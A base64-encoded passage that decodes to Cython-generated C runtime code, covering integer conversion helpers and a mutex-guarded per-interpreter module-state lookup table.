zdWx0X3R5cGVfbmFtZSkpIHsKICAgICAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHJlc3VsdF90eXBlX25hbWUpOwogICAgICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShyZXN1bHRfdHlwZV9uYW1lKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAiX19pbnRfXyByZXR1cm5lZCBub24taW50ICh0eXBlICIgX19QeXhfRk1UX1RZUEVOQU1FICIpIiwKICAgICAgICAgICAgICAgICByZXN1bHRfdHlwZV9uYW1lKTsKICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShyZXN1bHRfdHlwZV9uYW1lKTsKICAgIFB5X0RFQ1JFRihyZXN1bHQpOwogICAgcmV0dXJuIE5VTEw7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TnVtYmVyX0xvbmcoUHlPYmplY3QqIHgpIHsKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogIFB5TnVtYmVyTWV0aG9kcyAqbTsKI2VuZGlmCiAgUHlPYmplY3QgKnJlcyA9IE5VTEw7CiAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2soeCkpKQogICAgICByZXR1cm4gX19QeXhfTmV3UmVmKHgpOwojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgbSA9IFB5X1RZUEUoeCktPnRwX2FzX251bWJlcjsKICBpZiAobGlrZWx5KG0gJiYgbS0+bmJfaW50KSkgewogICAgICByZXMgPSBtLT5uYl9pbnQoeCk7CiAgfQojZWxzZQogIGlmICghUHlCeXRlc19DaGVja0V4YWN0KHgpICYmICFQeVVuaWNvZGVfQ2hlY2tFeGFjdCh4KSkgewogICAgICByZXMgPSBQeU51bWJlcl9Mb25nKHgpOwogIH0KI2VuZGlmCiAgaWYgKGxpa2VseShyZXMpKSB7CiAgICAgIGlmICh1bmxpa2VseSghUHlMb25nX0NoZWNrRXhhY3QocmVzKSkpIHsKICAgICAgICAgIHJldHVybiBfX1B5eF9QeU51bWJlcl9Mb25nV3JvbmdSZXN1bHRUeXBlKHJlcyk7CiAgICAgIH0KICB9CiAgZWxzZSBpZiAoIVB5RXJyX09jY3VycmVkKCkpIHsKICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICJhbiBpbnRlZ2VyIGlzIHJlcXVpcmVkIik7CiAgfQogIHJldHVybiByZXM7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCogYikgewogIFB5X3NzaXplX3QgaXZhbDsKICBQeU9iamVjdCAqeDsKICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KGIpKSkgewogICAgI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgaWYgKGxpa2VseShfX1B5eF9QeUxvbmdfSXNDb21wYWN0KGIpKSkgewogICAgICAgIHJldHVybiBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKGIpOwogICAgfSBlbHNlIHsKICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoYik7CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KGIpOwogICAgICBzd2l0Y2ggKHNpemUpIHsKICAgICAgICAgY2FzZSAyOgogICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgcmV0dXJuIChQeV9zc2l6ZV90KSAoKCgoKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSAtMjoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDIgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAtKFB5X3NzaXplX3QpICgoKCgoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgfQogICAgICAgICAgIGJyZWFrOwogICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICByZXR1cm4gKFB5X3NzaXplX3QpICgoKCgoKChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDMgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAtKFB5X3NzaXplX3QpICgoKCgoKChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSA0OgogICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgcmV0dXJuIChQeV9zc2l6ZV90KSAoKCgoKCgoKChzaXplX3QpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgfQogICAgICAgICAgIGJyZWFrOwogICAgICAgICBjYXNlIC00OgogICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgcmV0dXJuIC0oUHlfc3NpemVfdCkgKCgoKCgoKCgoc2l6ZV90KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogICAgI2VuZGlmCiAgICByZXR1cm4gUHlMb25nX0FzU3NpemVfdChiKTsKICB9CiAgeCA9IFB5TnVtYmVyX0luZGV4KGIpOwogIGlmICgheCkgcmV0dXJuIC0xOwogIGl2YWwgPSBQeUxvbmdfQXNTc2l6ZV90KHgpOwogIFB5X0RFQ1JFRih4KTsKICByZXR1cm4gaXZhbDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9oYXNoX3QgX19QeXhfUHlJbmRleF9Bc0hhc2hfdChQeU9iamVjdCogbykgewogIGlmIChzaXplb2YoUHlfaGFzaF90KSA9PSBzaXplb2YoUHlfc3NpemVfdCkpIHsKICAgIHJldHVybiAoUHlfaGFzaF90KSBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChvKTsKICB9IGVsc2UgewogICAgUHlfc3NpemVfdCBpdmFsOwogICAgUHlPYmplY3QgKng7CiAgICB4ID0gUHlOdW1iZXJfSW5kZXgobyk7CiAgICBpZiAoIXgpIHJldHVybiAtMTsKICAgIGl2YWwgPSBQeUxvbmdfQXNMb25nKHgpOwogICAgUHlfREVDUkVGKHgpOwogICAgcmV0dXJuIGl2YWw7CiAgfQp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9Pd25lZF9QeV9Ob25lKGludCBiKSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihiKTsKICAgIHJldHVybiBfX1B5eF9OZXdSZWYoUHlfTm9uZSk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUJvb2xfRnJvbUxvbmcobG9uZyBiKSB7CiAgcmV0dXJuIGIgPyBfX1B5eF9OZXdSZWYoUHlfVHJ1ZSkgOiBfX1B5eF9OZXdSZWYoUHlfRmFsc2UpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlMb25nX0Zyb21TaXplX3Qoc2l6ZV90IGl2YWwpIHsKICAgIHJldHVybiBQeUxvbmdfRnJvbVNpemVfdChpdmFsKTsKfQojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUxvbmdfQ29tcGFjdEFzTG9uZyhQeU9iamVjdCAqeCwgbG9uZyAqcmV0dXJuX3ZhbHVlKSB7CiAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpKQogICAgICAgIHJldHVybiAwOwogICAgUHlfc3NpemVfdCB2YWx1ZSA9IF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCk7CiAgICBpZiAoKHNpemVvZihsb25nKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgJiYgdW5saWtlbHkodmFsdWUgIT0gKGxvbmcpIHZhbHVlKSkKICAgICAgICByZXR1cm4gMDsKICAgICpyZXR1cm5fdmFsdWUgPSAobG9uZykgdmFsdWU7CiAgICByZXR1cm4gMTsKfQojZW5kaWYKCgoKI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQojaWZuZGVmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiNpZiAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwKQogICNkZWZpbmUgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgMQojZWxzZQogICNkZWZpbmUgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgMAojZW5kaWYKI2VuZGlmCiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRSAmJiAhQ1lUSE9OX0FUT01JQ1MKI2Vycm9yICJNb2R1bGUgc3RhdGUgd2l0aCBQRVA0ODkgcmVxdWlyZXMgYXRvbWljcy4gQ3VycmVudGx5IHRoYXQncyBvbmUgb2ZcCiBDMTEsIEMrKzExLCBnY2MgYXRvbWljIGludHJpbnNpY3Mgb3IgTVNWQyBhdG9taWMgaW50cmluc2ljcyIKI2VuZGlmCiNpZiAhQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKQojZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCnN0YXRpYyBQeU11dGV4IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gezB9OwojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBQeU11dGV4X0xvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KQojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpIFB5TXV0ZXhfVW5sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2VsaWYgZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgX19jcGx1c3BsdXMgPj0gMjAxMTAzTAojaW5jbHVkZSA8bXV0ZXg+CnN0YXRpYyBzdGQ6Om11dGV4IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4OwojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleC5sb2NrKCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleC51bmxvY2soKQojZWxpZiBkZWZpbmVkKF9fU1REQ19WRVJTSU9OX18pICYmIChfX1NURENfVkVSU0lPTl9fID4gMjAxMTEyTCkgJiYgIWRlZmluZWQoX19TVERDX05PX1RIUkVBRFNfXykKI2luY2x1ZGUgPHRocmVhZHMuaD4Kc3RhdGljIG10eF90IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4OwpzdGF0aWMgb25jZV9mbGFnIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4X29uY2VfZmxhZyA9IE9OQ0VfRkxBR19JTklUOwpzdGF0aWMgdm9pZCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9pbml0aWFsaXplX211dGV4KHZvaWQpIHsKICAgIG10eF9pbml0KCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCwgbXR4X3BsYWluKTsKfQojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKVwKICBjYWxsX29uY2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4X29uY2VfZmxhZywgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfaW5pdGlhbGl6ZV9tdXRleCk7XAogIG10eF9sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBtdHhfdW5sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2VsaWYgZGVmaW5lZChIQVZFX1BUSFJFQURfSCkKI2luY2x1ZGUgPHB0aHJlYWQuaD4Kc3RhdGljIHB0aHJlYWRfbXV0ZXhfdCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCA9IFBUSFJFQURfTVVURVhfSU5JVElBTElaRVI7CiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIHB0aHJlYWRfbXV0ZXhfbG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgcHRocmVhZF9tdXRleF91bmxvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KQojZWxpZiBkZWZpbmVkKF9XSU4zMikKI2luY2x1ZGUgPFdpbmRvd3MuaD4gIC8vIHN5bmNoYXBpLmggb24gaXRzIG93biBkb2Vzbid0IHdvcmsKc3RhdGljIFNSV0xPQ0sgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXggPSBTUldMT0NLX0lOSVQ7CiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIEFjcXVpcmVTUldMb2NrRXhjbHVzaXZlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBSZWxlYXNlU1JXTG9ja0V4Y2x1c2l2ZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNlbHNlCiNlcnJvciAiTm8gc3VpdGFibGUgbG9jayBhdmFpbGFibGUgZm9yIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFLlwKIFJlcXVpcmVzIEMgc3RhbmRhcmQgPj0gQzExLCBvciBDKysgc3RhbmRhcmQgPj0gQysrMTEsXAogb3IgcHRocmVhZHMsIG9yIHRoZSBXaW5kb3dzIDMyIEFQSSwgb3IgUHl0aG9uID49IDMuMTMuIgojZW5kaWYKdHlwZWRlZiBzdHJ1Y3QgewogICAgaW50NjRfdCBpZDsKICAgIFB5T2JqZWN0ICptb2R1bGU7Cn0gX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZTsKdHlwZWRlZiBzdHJ1Y3QgewogICAgY2hhciBpbnRlcnByZXRlcl9pZF9hc19pbmRleDsKICAgIFB5X3NzaXplX3QgY291bnQ7CiAgICBQeV9zc2l6ZV90IGFsbG9jYXRlZDsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgdGFibGVbMV07Cn0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhOwojZGVmaW5lIF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSAzMgojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKc3RhdGljIF9fcHl4X2F0b21pY19pbnRfdHlwZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIgPSAwOwojZW5kaWYKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCnN0YXRpYyBfX3B5eF9hdG9taWNfcHRyX3R5cGUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IDA7CiNlbHNlCnN0YXRpYyBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEgPSBOVUxMOwojZW5kaWYKc3RhdGljIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZCgKICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiB0YWJsZSwKICAgICAgICBQeV9zc2l6ZV90IGNvdW50LAogICAgICAgIGludDY0X3QgaW50ZXJwcmV0ZXJJZCkgewogICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogYmVnaW4gPSB0YWJsZTsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGVuZCA9IGJlZ2luICsgY291bnQ7CiAgICBpZiAoYmVnaW4tPmlkID09IGludGVycHJldGVySWQpIHsKICAgICAgICByZXR1cm4gYmVnaW47CiAgICB9CiAgICB3aGlsZSAoKGVuZCAtIGJlZ2luKSA+IF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSkgewogICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGhhbGZ3YXkgPSBiZWdpbiArIChlbmQgLSBiZWdpbikvMjsKICAgICAgICBpZiAoaGFsZndheS0+aWQgPT0gaW50ZXJwcmV0ZXJJZCkgewogICAgICAgICAgICByZXR1cm4gaGFsZndheTsKICAgICAgICB9CiAgICAgICAgaWYgKGhhbGZ3YXktPmlkIDwgaW50ZXJwcmV0ZXJJZCkgewogICAgICAgICAgICBiZWdpbiA9IGhhbGZ3YXk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZW5kID0gaGFsZndheTsKICAgICAgICB9CiAgICB9CiAgICBmb3IgKDsgYmVnaW4gPCBlbmQ7ICsrYmVnaW4pIHsKICAgICAgICBpZiAoYmVnaW4tPmlkID49IGludGVycHJldGVySWQpIHJldHVybiBiZWdpbjsKICAgIH0KICAgIHJldHVybiBiZWdpbjsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUoQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkgewogICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpOwogICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIGRhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKilfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEpOwogICAgewogICAgICAgIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7CiAgICAgICAgaWYgKGxpa2VseShkYXRhKSkgewogICAgICAgICAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhKTsKICAgICAgICAgICAgaWYgKGxpa2VseShkYXRhID09IG5ld19kYXRhKSkgewogICAgICAgICAgICAgICAgZ290byByZWFkX2ZpbmlzaGVkOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7CiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpOwogICAgICAgIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7CiAgICAgICAgZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7CiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7CiAgICB9CiAgcmVhZF9maW5pc2hlZDo7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIGRhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhOwojZW5kaWYKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGZvdW5kID0gTlVMTDsKICAgIGlmICh1bmxpa2VseSghZGF0YSkpIGdvdG8gZW5kOwogICAgaWYgKGRhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7CiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgZGF0YS0+Y291bnQpIHsKICAgICAgICAgICAgZm91bmQgPSBkYXRhLT50YWJsZStpbnRlcnByZXRlcl9pZDsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIGZvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKAogICAgICAgICAgICBkYXRhLT50YWJsZSwgZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTsKICAgIH0KICBlbmQ6CiAgICB7CiAgICAgICAgUHlPYmplY3QgKnJlc3VsdD1OVUxMOwogICAgICAgIGlmIChmb3VuZCAmJiBmb3VuZC0+aWQgPT0gaW50ZXJwcmV0ZXJfaWQpIHsKICAgICAgICAgICAgcmVzdWx0ID0gZm91bmQtPm1vZHVsZTsKICAgICAgICB9CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7CiNlbmRpZgogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9Cn0KI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCnN0YXRpYyB2b2lkIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycyh2b2lkKSB7CiAgICB3aGlsZSAoX19weXhfYXRvbWljX2xvYWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcikgIT0gMCk7Cn0KI2Vsc2UKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnMoKQojZW5kaWYKc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGVJbnRlcnBJZEFzSW5kZXgoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICoqb2xkX2RhdGEsIFB5T2JqZWN0KiBtb2R1bGUsIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQpIHsKICAgIFB5X3NzaXplX3QgdG9fYWxsb2NhdGUgPSAoKm9sZF9kYXRhKS0+YWxsb2NhdGVkOwogICAgd2hpbGUgKHRvX2FsbG9jYXRlIDw9IGludGVycHJldGVyX2lkKSB7CiAgICAgICAgaWYgKHRvX2FsbG9jYXRlID09IDApIHRvX2FsbG9jYXRlID0gMTsKICAgICAgICBlbHNlIHRvX2FsbG9jYXRlICo9IDI7CiAgICB9CiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm5ld19kYXRhID0gKm9sZF9kYXRhOwogICAgaWYgKHRvX2FsbG9jYXRlICE9ICgqb2xkX2RhdGEpLT5hbGxvY2F0ZWQpIHsKICAgICAgICAgbmV3X2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopcmVhbGxvYygKICAgICAgICAgICAgKm9sZF9kYXRhLAogICAgICAgICAgICBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSsodG9fYWxsb2NhdGUtMSkqc2l6ZW9mKF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUpKTsKICAgICAgICBpZiAoIW5ld19kYXRhKSB7CiAgICAgICAgICAgIFB5RXJyX05vTWVtb3J5KCk7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CiAgICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBuZXdfZGF0YS0+YWxsb2NhdGVkOyBpIDwgdG9fYWxsb2NhdGU7ICsraSkgewogICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0uaWQgPSBpOwogICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0ubW9kdWxlID0gTlVMTDsKICAgICAgICB9CiAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IHRvX2FsbG9jYXRlOwogICAgfQogICAgbmV3X2RhdGEtPnRhYmxlW2ludGVycHJldGVyX2lkXS5tb2R1bGUgPSBtb2R1bGU7CiAgICBpZiAobmV3X2RhdGEtPmNvdW50IDwgaW50ZXJwcmV0ZXJfaWQrMSkgewogICAgICAgIG5ld19kYXRhLT5jb3VudCA9IGludGVycHJldGVyX2lkKzE7CiAgICB9CiAgICAqb2xkX2RhdGEgPSBuZXdfZGF0YTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyB2b2lkIF9fUHl4X1N0YXRlX0NvbnZlcnRGcm9tSW50ZXJwSWRBc0luZGV4KF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqZGF0YSkgewogICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSAqcmVhZCA9IGRhdGEtPnRhYmxlOwogICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSAqd3JpdGUgPSBkYXRhLT50YWJsZTsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKmVuZCA9IHJlYWQgKyBkYXRhLT5jb3VudDsKICAgIGZvciAoOyByZWFkPGVuZDsgKytyZWFkKSB7CiAgICAgICAgaWYgKHJlYWQtPm1vZHVsZSkgewogICAgICAgICAgICB3cml0ZS0+aWQgPSByZWFkLT5pZDsKICAgICAgICAgICAgd3JpdGUtPm1vZHVsZSA9IHJlYWQtPm1vZHVsZTsKICAgICAgICAgICAgKyt3cml0ZTsKICAgICAgICB9CiAgICB9CiAgICBkYXRhLT5jb3VudCA9IHdyaXRlIC0gZGF0YS0+dGFibGU7CiAg